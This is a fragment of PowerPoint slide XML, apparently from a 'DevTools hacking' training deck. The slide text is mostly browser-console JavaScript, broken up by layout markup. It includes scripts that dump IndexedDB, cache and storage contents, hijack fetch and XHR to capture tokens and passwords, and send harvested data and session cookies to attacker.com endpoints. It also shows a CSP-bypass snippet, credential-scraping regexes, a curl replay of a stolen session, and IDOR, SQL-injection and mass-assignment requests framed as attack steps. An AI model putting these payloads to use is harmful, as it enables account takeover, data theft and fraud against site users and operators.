            <a:ext cx="956060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Tab → IndexedDB → Expand databases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34841" y="2297311"/>
            <a:ext cx="36591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Access IndexedDB Programmatically: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34841" y="2684026"/>
            <a:ext cx="9560600" cy="4493895"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 129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2527935" y="2684026"/>
            <a:ext cx="9574411" cy="4493895"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 46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666405" y="2787848"/>
            <a:ext cx="9297472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List all databases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indexedDB.databases().then(dbs =&gt; {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console.log('IndexedDB Databases:', dbs);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Open specific database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request = indexedDB.open('myDatabase', 1);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request.onsuccess = function(event) {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db = event.target.result;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console.log('Database opened:', db);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List object stores (tables)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console.log('Object Stores:', Array.from(db.objectStoreNames));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Read data from object store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transaction = db.transaction(['users'], 'readonly');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objectStore = transaction.objectStore('users');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getAllRequest = objectStore.getAll();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getAllRequest.onsuccess = function() {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console.log('All users:', getAllRequest.result);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};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77647"/>
            <a:ext cx="293489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All IndexedDB Data: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3402449" y="1574483"/>
            <a:ext cx="7825502" cy="5477470"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 87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396853" y="1574483"/>
            <a:ext cx="7836694" cy="5477470"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 31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3510201" y="1659493"/>
            <a:ext cx="7609999" cy="530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Complete IndexedDB dump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async function dumpIndexedDB()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databases = await indexedDB.databases();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allData = {};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for(let dbInfo of databases)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db = await new Promise((resolve, reject)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request = indexedDB.open(dbInfo.name);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request.onsuccess = () =&gt; resolve(request.result);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request.onerror = () =&gt; reject(request.error);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allData[dbInfo.name] = {};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for(let storeName of db.objectStoreNames)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data = await new Promise((resolve, reject)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transaction = db.transaction([storeName], 'readonly');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store = transaction.objectStore(storeName);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request = store.getAll();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request.onsuccess = () =&gt; resolve(request.result);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request.onerror = () =&gt; reject(request.error);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allData[dbInfo.name][storeName] = data;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console.log('Complete IndexedDB dump:', allData);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allData;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Execute dump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dumpIndexedDB().then(data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Send to attacker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fetch('https://attacker.com/indexeddb.php',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method: 'POST',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body: JSON.stringify(data)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743903"/>
            <a:ext cx="35843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6.5 Cache Storage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112085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Cache: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3402449" y="148935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Tab → Cache Storage → Expand caches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02449" y="1710452"/>
            <a:ext cx="262925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Access Cache Programmatically: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02449" y="2008108"/>
            <a:ext cx="7825502" cy="5477470"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 870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3396853" y="2008108"/>
            <a:ext cx="7836694" cy="5477470"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 31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510201" y="2093119"/>
            <a:ext cx="7609999" cy="5307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List all caches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caches.keys().then(cacheNames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console.log('Cache names:', cacheNames);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Open each cache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cacheNames.forEach(cacheName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caches.open(cacheName).then(cache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cache.keys().then(requests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console.log(`Cache ${cacheName}:`, requests.map(r =&gt; r.url));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Extract cached responses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async function dumpCache()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cacheNames = await caches.keys();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allCached = {};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for(let name of cacheNames)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cache = await caches.open(name);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requests = await cache.keys();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allCached[name] = [];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for(let request of requests)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response = await cache.match(request);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content = await response.text();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allCached[name].push({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url: request.url,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content: content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console.log('Cached data:', allCached);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allCached;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dumpCache();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3249" y="630436"/>
            <a:ext cx="4033957" cy="757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 Security Tab - Certificate &amp; Security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3133249" y="1413748"/>
            <a:ext cx="2978587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Hackers Check Here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133249" y="1781532"/>
            <a:ext cx="4033957" cy="14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Tab shows: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133249" y="1988463"/>
            <a:ext cx="4033957" cy="74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TLS/SSL certificate details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Certificate chain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protocol version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Cipher suite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Mixed content warnings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33249" y="2797192"/>
            <a:ext cx="1999774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Certificate Information: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33249" y="3089134"/>
            <a:ext cx="4033957" cy="14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 for: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33249" y="3296064"/>
            <a:ext cx="4033957" cy="74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Self-signed certificates (untrusted)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Expired certificates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Certificate mismatch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Weak cipher suites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Old TLS versions (TLS 1.0, 1.1)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49" y="4112890"/>
            <a:ext cx="2882146" cy="2207657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577" y="638532"/>
            <a:ext cx="4033957" cy="210228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577" y="2723612"/>
            <a:ext cx="2343388" cy="258258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577" y="5288990"/>
            <a:ext cx="4033957" cy="212181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681514"/>
            <a:ext cx="56480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 Advanced DevTools Hacking Techniques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1058466"/>
            <a:ext cx="431720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8.1 Monkeypatching (Function Hijacking)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3402449" y="1364575"/>
            <a:ext cx="218479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Override Built-in Functions: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02449" y="1662232"/>
            <a:ext cx="7825502" cy="5885736"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 809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396853" y="1662232"/>
            <a:ext cx="7836694" cy="5885736"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 28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510201" y="1747242"/>
            <a:ext cx="7609999" cy="571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Override fetch to intercept all API calls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originalFetch = window.fetch;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window.fetch = function(...args)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[resource, config] = args;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console.log('Fetch intercepted:', resource, config);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Log request body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if(config &amp;&amp; config.body)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console.log('Request body:', config.body);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Modify request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if(resource.includes('/api/admin'))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Add admin token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config.headers = config.headers || {};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config.headers['X-Admin-Token'] = 'stolen-admin-token';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Make request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originalFetch.apply(this, args)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.then(response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Log response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console.log('Response status:', response.status);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Clone response to read body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clonedResponse = response.clone();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clonedResponse.json().then(data =&gt;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console.log('Response data:', data);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Send sensitive data to attacker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if(data.token || data.password || data.api_key)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fetch('https://attacker.com/log.php',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method: 'POST',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body: JSON.stringify(data)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response;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783" y="830104"/>
            <a:ext cx="3560921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Override XMLHttpRequest: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931783" y="1478756"/>
            <a:ext cx="12766715" cy="5920621"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1313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22615" y="1478756"/>
            <a:ext cx="12785050" cy="5920621"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 46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07638" y="1617464"/>
            <a:ext cx="12415004" cy="5643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Intercept all XHR requests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originalOpen = XMLHttpRequest.prototype.open;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originalSend = XMLHttpRequest.prototype.send;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XMLHttpRequest.prototype.open = function(method, url)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this._method = method;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this._url = url;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originalOpen.apply(this, arguments);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XMLHttpRequest.prototype.send = function(body)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console.log(`XHR ${this._method} ${this._url}`);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console.log('Body:', body);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Intercept response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this.addEventListener('load', function() {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console.log('Response:', this.responseText);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originalSend.apply(this, arguments);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="145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3546" y="1057156"/>
            <a:ext cx="4701302" cy="422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8.2 DOM Mutation Monitoring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2653546" y="1511498"/>
            <a:ext cx="306514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Track All DOM Changes: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653546" y="1970008"/>
            <a:ext cx="9323308" cy="5202317"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 109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646878" y="1970008"/>
            <a:ext cx="9336643" cy="5202317"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 39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781895" y="2071330"/>
            <a:ext cx="9066609" cy="499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Monitor all DOM modifications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observer = new MutationObserver(mutations =&gt;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mutations.forEach(mutation =&gt;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console.log('DOM changed:', mutation);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if(mutation.type === 'childList')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console.log('Added nodes:', mutation.addedNodes);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console.log('Removed nodes:', mutation.removedNodes);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if(mutation.type === 'attributes')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console.log(`Attribute ${mutation.attributeName} changed on`, mutation.target);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if(mutation.type === 'characterData')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console.log('Text content changed:', mutation.target.textContent);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Observe entire document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observer.observe(document.documentElement, {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childList: true,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subtree: true,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attributes: true,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characterData: true,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attributeOldValue: true,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characterDataOldValue: true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6395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Event Listener Hijacking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Intercept All Events</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1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3799" y="1076682"/>
            <a:ext cx="4228267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8.3 Event Listener Hijacking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773799" y="1518523"/>
            <a:ext cx="2632710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Intercept All Events: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2773799" y="1962031"/>
            <a:ext cx="9082802" cy="5190887"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 106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767251" y="1962031"/>
            <a:ext cx="9095899" cy="5190887"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 38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898815" y="2060734"/>
            <a:ext cx="8832771" cy="4993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Get all event listeners on an element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function getAllEventListeners(element) {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getEventListeners(element);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Example: Get click listeners on button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button = document.querySelector('button');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console.log('Click listeners:', getEventListeners(button).click);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Override event listener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originalListener = button.onclick;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button.onclick = function(event) {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console.log('Button clicked!');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Don't call original to prevent action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originalListener.call(this, event);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Or intercept addEventListener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originalAddEventListener = Element.prototype.addEventListener;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Element.prototype.addEventListener = function(type, listener) {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console.log(`Event listener added: ${type}`, listener);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Wrap listener to intercept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let wrappedListener = function(event) {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console.log(`Event fired: ${type}`, event);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listener.apply(this, arguments);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return originalAddEventListener.call(this, type, wrappedListener);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814" y="1120259"/>
            <a:ext cx="8034457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8.4 Bypassing Content Security Policy (CSP)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8814" y="1649968"/>
            <a:ext cx="3582710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CSP Bypass Techniques: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1938814" y="2200037"/>
            <a:ext cx="10752653" cy="5069681"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 129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931075" y="2200037"/>
            <a:ext cx="10768132" cy="5069681"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 46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086808" y="2316837"/>
            <a:ext cx="10456664" cy="483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1. Find CSP violations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document.addEventListener('securitypolicyviolation', (e) =&gt; {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console.log('CSP Violation:', e.violatedDirective, e.blockedURI);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2. Use allowed sources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If CSP allows 'self', inject script from same origin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script = document.createElement('script');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script.src = '/allowed-script.js';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document.head.appendChild(script);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3. Use data URLs (if allowed)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dataScript = document.createElement('script');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dataScript.textContent = `alert('XSS via data URL'); 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fetch('https://attacker.com/steal?data=' + document.cookie);`;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document.head.appendChild(dataScript);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4. Use event handlers (if inline scripts blocked)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document.body.innerHTML += '';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5. Use dangerouslySetInnerHTML in React (if vulnerable)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React.createElement('div', {</a:t>
            </a:r>
            <a:endParaRPr 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  dangerouslySetInnerHTML: {__html: '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7439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8.5 Privilege Escalation via DevTools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68877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Elevate Permissions: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3402449" y="1057275"/>
            <a:ext cx="7825502" cy="7110532"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 67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396853" y="1057275"/>
            <a:ext cx="7836694" cy="7110532"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 23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3510201" y="1142286"/>
            <a:ext cx="7609999" cy="694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Check current permissions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console.log("Current user object:", window.currentUser);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console.log("Current localStorage user:", localStorage.getItem('user'));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console.log("Current sessionStorage user:", sessionStorage.getItem('user'));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Modify user object (e.g., in window scope)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 (window.currentUser)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window.currentUser.isAdmin = true;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window.currentUser.roles.push('admin');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console.log("window.currentUser modified:", window.currentUser);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Update in localStorage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localStorageUser = JSON.parse(localStorage.getItem('user'));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 (localStorageUser)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localStorageUser.isAdmin = true;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localStorage.setItem('user', JSON.stringify(localStorageUser));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console.log("localStorage user updated:", localStorage.getItem('user'));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Update in sessionStorage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sessionStorageUser = JSON.parse(sessionStorage.getItem('user'));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if (sessionStorageUser)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sessionStorageUser.isAdmin = true;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sessionStorage.setItem('user', JSON.stringify(sessionStorageUser));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console.log("sessionStorage user updated:", sessionStorage.getItem('user'));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Update in IndexedDB (example for a database named 'appDB' and store 'users')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request = indexedDB.open('appDB', 1);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request.onsuccess = function(event)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db = event.target.result;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transaction = db.transaction(['users'], 'readwrite');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store = transaction.objectStore('users');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// Assuming a user with ID 1 exists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getRequest = store.get(1);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getRequest.onsuccess = function()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let user = getRequest.result;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if (user)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user.isAdmin = true;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const updateRequest = store.put(user);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updateRequest.onsuccess = function()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console.log("IndexedDB user updated:", user);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Reload to apply changes (e.g., if application re-reads permissions on load)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location.reload();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330" y="1329333"/>
            <a:ext cx="5379363" cy="440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8.6 Exfiltrating Data via DevTools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52330" y="1804868"/>
            <a:ext cx="37730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Data Harvesting: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452330" y="2387084"/>
            <a:ext cx="4690824" cy="4414718"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 134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2445306" y="2387084"/>
            <a:ext cx="4704874" cy="4414718"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 47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586157" y="2492693"/>
            <a:ext cx="4423172" cy="4203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data = {
  ls: Object.fromEntries(
    Array.from({ length: localStorage.length }, (_, i) =&gt; [
      localStorage.key(i),
      localStorage.getItem(localStorage.key(i))
    ])
  ),
  ss: Object.fromEntries(
    Array.from({ length: sessionStorage.length }, (_, i) =&gt; [
      sessionStorage.key(i),
      sessionStorage.getItem(sessionStorage.key(i))
    ])
  ),
  forms: Array.from(document.querySelectorAll('form')).map(form =&gt;
    Object.fromEntries(
      Array.from(form.querySelectorAll('input, textarea, select'))
        .filter(f =&gt; f.name)
        .map(f =&gt; [f.name, f.value])
    )
  ),
};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4627" y="2387084"/>
            <a:ext cx="4690824" cy="3866436"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 153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487602" y="2387084"/>
            <a:ext cx="4704874" cy="3866436"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 54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628453" y="2492693"/>
            <a:ext cx="4423172" cy="365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src = document.documentElement.innerHTML;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data.api = [...new Set(src.match(/https?:\/\/[^s"'&lt;&gt;]+api[^s"'&lt;&gt;]*/gi) || [])];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data.secrets = [];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patterns =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'API Keys': /api[_-]?key["\s:=]+["']?([a-zA-Z0-9_\-]{20,})/gi,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'AWS Keys': /AKIA[0-9A-Z]{16}/g,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'Tokens': /token["\s:=]+["']([a-zA-Z0-9_\-\.]{20,})["']/gi,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'Passwords': /password["\s:=]+["']([^"']{5,})["']/gi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(let type in patterns)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matches = src.match(patterns[type]);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if (matches) data.secrets.push({ type, matches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console.log('Exfiltrated:', data);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fetch('https://attacker.com/harvest.php',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method: 'POST',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body: JSON.stringify(data),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headers: { 'Content-Type': 'application/json' }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34" y="714494"/>
            <a:ext cx="10480715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9. Real-World Attack Scenarios Using DevTools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91634" y="1379220"/>
            <a:ext cx="7879913" cy="47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Scenario 1: E-Commerce Price Manipulation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1634" y="1924050"/>
            <a:ext cx="4364236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Target: Online shopping website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91634" y="2348865"/>
            <a:ext cx="2879765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 Steps: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91634" y="2952512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34" y="3255883"/>
            <a:ext cx="4307324" cy="22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1634" y="3397568"/>
            <a:ext cx="242601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Inspect Product Page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91634" y="3794998"/>
            <a:ext cx="4307324" cy="113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product page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Press F12 to open DevTools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 to Elements tab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 price element: $999.99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61359" y="2952512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359" y="3275052"/>
            <a:ext cx="4307443" cy="228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1359" y="3397568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Modify Price in DOM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5161359" y="3861197"/>
            <a:ext cx="4307443" cy="854869"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9432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1834" y="3861197"/>
            <a:ext cx="4326493" cy="854869"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3369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5343763" y="4024312"/>
            <a:ext cx="3942636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document.querySelector('.price').textContent = '$0.99';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631204" y="2952512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204" y="3275052"/>
            <a:ext cx="4307324" cy="228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31204" y="3397568"/>
            <a:ext cx="289476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Modify Hidden Form Field</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9631204" y="3861197"/>
            <a:ext cx="4307324" cy="854869"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9432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9621679" y="3861197"/>
            <a:ext cx="4326374" cy="854869"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3369"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9813608" y="4024312"/>
            <a:ext cx="3942517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document.querySelector('input[name="price"]').value = '0.99';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91634" y="5235690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34" y="5519892"/>
            <a:ext cx="6542246" cy="228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634" y="5680745"/>
            <a:ext cx="330505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Bypass Client-Side Validation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691634" y="6078176"/>
            <a:ext cx="6542246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showing how to remove validation and disable submit button protection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96282" y="5235690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5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282" y="5519892"/>
            <a:ext cx="6542246" cy="228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96282" y="5680745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Submit Order</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7396282" y="6125206"/>
            <a:ext cx="6542246" cy="571381"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 14112"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7386757" y="6125206"/>
            <a:ext cx="6561296" cy="571381"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5040"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7578685" y="6307490"/>
            <a:ext cx="617743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document.querySelector('form').submit();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91634" y="7061632"/>
            <a:ext cx="1324701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</a:t>
            </a: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Order placed for $0.99 instead of $999.99 (if server doesn't validate)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6654" y="1196340"/>
            <a:ext cx="6193750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Scenario 2: Account Privilege Escalation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56654" y="1639848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756654" y="2002988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panel with role-based access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56654" y="2285643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 Steps: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756654" y="2648783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1: Analyze Authentication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56654" y="2902625"/>
            <a:ext cx="911709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 Open DevTools → Application tab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Check Cookies → Find session cookie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Check LocalStorage → Find user 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56654" y="3491032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2: Modify User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56654" y="3744873"/>
            <a:ext cx="9117092" cy="1034534"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5364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2750106" y="3744873"/>
            <a:ext cx="9130189" cy="1034534"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 191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882146" y="3843933"/>
            <a:ext cx="8866108" cy="836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 Console tab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user = JSON.parse(localStorage.getItem('user'));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user.role = 'admin';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user.permissions = ['read', 'write', 'delete', 'admin'];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localStorage.setItem('user', JSON.stringify(user));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56654" y="4865965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3: Update Cookie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56654" y="5119807"/>
            <a:ext cx="9117092" cy="699968"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7928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0106" y="5119807"/>
            <a:ext cx="9130189" cy="699968"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 283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2882146" y="5218867"/>
            <a:ext cx="8866108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Change role cookie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"role=admin; path=/";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document.cookie = "isAdmin=true; path=/";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56654" y="5906333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4: Reload Page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56654" y="6160175"/>
            <a:ext cx="9117092" cy="365403"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 15188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0106" y="6160175"/>
            <a:ext cx="9130189" cy="365403"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 542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2882146" y="6259235"/>
            <a:ext cx="8866108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location.reload();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56654" y="6612136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5: Access Admin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56654" y="6865977"/>
            <a:ext cx="9117092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 panel now accessible with elevated privileges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2301" y="1225629"/>
            <a:ext cx="4083606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Scenario 3: Session Hijacking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3172301" y="1626156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172301" y="1946553"/>
            <a:ext cx="8285798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application with session-based authentication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72301" y="2188726"/>
            <a:ext cx="1801178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 Steps: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72301" y="2509123"/>
            <a:ext cx="8285798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1: Extract Session Cookie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72301" y="2727484"/>
            <a:ext cx="8285798" cy="1502331"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3357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3166348" y="2727484"/>
            <a:ext cx="8297704" cy="1502331"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 119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3286363" y="2817495"/>
            <a:ext cx="8057674" cy="132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 Console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sessionCookie = document.cookie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.split(';')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.find(c =&gt; c.includes('PHPSESSID') || c.includes('session_id'))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.trim();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console.log('Session:', sessionCookie);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Copy for later use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copy(sessionCookie);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72301" y="4301252"/>
            <a:ext cx="8285798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2: Send to Attacker Server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301" y="4519613"/>
            <a:ext cx="8285798" cy="1355408"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3721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66348" y="4519613"/>
            <a:ext cx="8297704" cy="1355408"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1329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3286363" y="4609624"/>
            <a:ext cx="8057674" cy="1175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fetch('https://attacker.com/steal.php', {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method: 'POST',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body: JSON.stringify({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session: sessionCookie,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userAgent: navigator.userAgent,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url: location.href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})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2301" y="5946457"/>
            <a:ext cx="8285798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3: Attacker Uses Session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72301" y="6164818"/>
            <a:ext cx="8285798" cy="620792"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8124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6348" y="6164818"/>
            <a:ext cx="8297704" cy="620792"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2902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286363" y="6254829"/>
            <a:ext cx="8057674" cy="44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Attacker sets cookie in their browser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Then accesses the site as the victim</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="9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curl -b "PHPSESSID=stolen_session_id" https://victim.com/dashboard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2301" y="6857048"/>
            <a:ext cx="8285798" cy="146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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="9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Attacker gains access to victim's account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6167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Scenario 4: API Endpoint Discovery &amp; Exploitation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68877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02449" y="98643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Single Page Application (SPA) with REST API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02449" y="120753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Attack Steps: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02449" y="1505188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1: Monitor Network Traffic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02449" y="1704975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 Open DevTools → Network tab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2. Perform actions on the website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 Observe API calls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02449" y="2176939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2: Identify Endpoints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02449" y="2376726"/>
            <a:ext cx="7825502" cy="850463"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5601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396853" y="2376726"/>
            <a:ext cx="7836694" cy="850463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510201" y="2461736"/>
            <a:ext cx="760999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GET /api/v1/users/12345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GET /api/v1/users/12345/profile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POST /api/v1/users/12345/update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DELETE /api/v1/users/12345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GET /api/v1/admin/settings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02449" y="3290888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3: Extract Authentication Token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02449" y="3490674"/>
            <a:ext cx="7825502" cy="986552"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4828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96853" y="3490674"/>
            <a:ext cx="7836694" cy="986552"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1724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3510201" y="3575685"/>
            <a:ext cx="7609999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In Console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token = localStorage.getItem('auth_token') ||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localStorage.getItem('jwt') || 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localStorage.getItem('access_token');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console.log('Token:', token);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copy(token);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2449" y="454092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Step 4: Test API Endpoints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02449" y="4740712"/>
            <a:ext cx="7825502" cy="3300055"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1443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3396853" y="4740712"/>
            <a:ext cx="7836694" cy="3300055"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 516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3510201" y="4825722"/>
            <a:ext cx="7609999" cy="313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Test user enumeration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for(let i = 1; i &lt;= 100; i++)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fetch(`/api/v1/users/${i}`,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headers: {'Authorization': `Bearer ${token}`}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.then(r =&gt; r.json())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.then(data =&gt; console.log(`User ${i}:`, data));}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Test privilege escalation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fetch('/api/v1/users/12345/update',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method: 'POST',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headers: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'Authorization': `Bearer ${token}`,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'Content-Type': 'application/json'},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body: JSON.stringify({role: 'admin'})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.then(r =&gt; r.json())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.then(data =&gt; console.log('Updated:', data));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Test admin endpoints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fetch('/api/v1/admin/users', {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headers: {'Authorization': `Bearer ${token}`}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.then(r =&gt; r.json())</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="8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.then(data =&gt; console.log('Admin users:', data));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428" y="1102162"/>
            <a:ext cx="391239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Step 5: Exploit Vulnerabilities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58428" y="1856423"/>
            <a:ext cx="4508897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IDOR (Insecure Direct Object Reference)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58428" y="2312432"/>
            <a:ext cx="6324838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 other users' data by changing resource IDs in API requests.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8428" y="2770823"/>
            <a:ext cx="6324838" cy="1122998"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 710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49022" y="2770823"/>
            <a:ext cx="6343650" cy="1122998"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 253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39046" y="2913340"/>
            <a:ext cx="5963603" cy="8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t=localStorage.getItem('auth_token');</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="145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fetch('/api/v1/users/1/profile',{headers:{'Authorization':`Bearer ${t}`}}).then(r=&gt;r.json()).then(d=&gt;console.log(d));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428" y="4072890"/>
            <a:ext cx="2375535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SQL Injection in API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58428" y="4528899"/>
            <a:ext cx="6324838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Inject malicious SQL queries into API parameters without proper sanitization.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8428" y="5266611"/>
            <a:ext cx="6324838" cy="1681639"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 474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49022" y="5266611"/>
            <a:ext cx="6343650" cy="1681639"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 169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939046" y="5409128"/>
            <a:ext cx="5963603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t=localStorage.getItem('auth_token');</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="145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fetch('/api/v1/products?category=electronics%27%20OR%201%3D1%3B%20--', {headers:{'Authorization':`Bearer ${t}`}}).then(r=&gt;r.json()).then(d=&gt;console.log(d));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54516" y="1856423"/>
            <a:ext cx="2375535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Mass Assignment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54516" y="2312432"/>
            <a:ext cx="6324838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Set unauthorized properties (e.g., admin privileges) by including extra fields in the request body.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554516" y="3050143"/>
            <a:ext cx="6324838" cy="1960959"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4071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5110" y="3050143"/>
            <a:ext cx="6343650" cy="1960959"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1454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35133" y="3192661"/>
            <a:ext cx="5963603" cy="1675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t=localStorage.getItem('auth_token');</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="145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fetch('/api/v1/users/me',{method:'PUT',headers:{'Authorization':`Bearer ${t}`,'Content-Type':'application/json'},body:JSON.stringify({name:'Attacker',role:'admin',isAdmin:true,permissions:['admin_access']})}).then(r=&gt;r.json()).then(d=&gt;console.log(d));</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14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30BA452-FD5E-7CC4-9B3A-3CEF6584F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67"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="927585" y="0"/>
            <a:ext cx="11784630" cy="78867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658" y="789861"/>
            <a:ext cx="4954905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 DevTools Snippets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3658" y="1478399"/>
            <a:ext cx="7236619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Using Chrome DevTools Snippets for Reusable Code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3658" y="2109668"/>
            <a:ext cx="13243084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Chrome DevTools Snippets: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3658" y="2601516"/>
            <a:ext cx="13243084" cy="59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Snippet - DevTools → Sources → Snippets → Create new snippet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Write Reusable Code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3658" y="3455403"/>
            <a:ext cx="4788813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Snippet: Complete Data Harvester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3658" y="4086672"/>
            <a:ext cx="13243084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Include the full async harvestData() function that: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3658" y="4578520"/>
